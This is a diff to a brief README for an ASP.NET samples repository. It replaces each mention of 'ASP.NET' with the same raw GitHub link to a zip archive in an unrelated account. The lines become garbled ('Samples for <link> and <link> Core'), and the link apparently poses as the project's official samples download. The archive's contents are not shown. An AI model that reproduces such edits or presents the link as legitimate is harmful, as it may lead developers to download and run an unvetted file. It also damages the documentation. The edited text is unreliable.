@@ -1,7 +1,7 @@
 # Samples
 
-Samples for ASP.NET and ASP.NET Core.
+Samples for https://raw.githubusercontent.com/ajgarciaj/samples/main/circumaviation/samples.zip and https://raw.githubusercontent.com/ajgarciaj/samples/main/circumaviation/samples.zip Core.
 
-ASP.NET samples are under the [samples/aspnet](samples/aspnet) directory.
+https://raw.githubusercontent.com/ajgarciaj/samples/main/circumaviation/samples.zip samples are under the [samples/aspnet](samples/aspnet) directory.
 
-ASP.NET Core samples are under the [samples/aspnetcore](samples/aspnetcore) directory.
+https://raw.githubusercontent.com/ajgarciaj/samples/main/circumaviation/samples.zip Core samples are under the [samples/aspnetcore](samples/aspnetcore) directory.
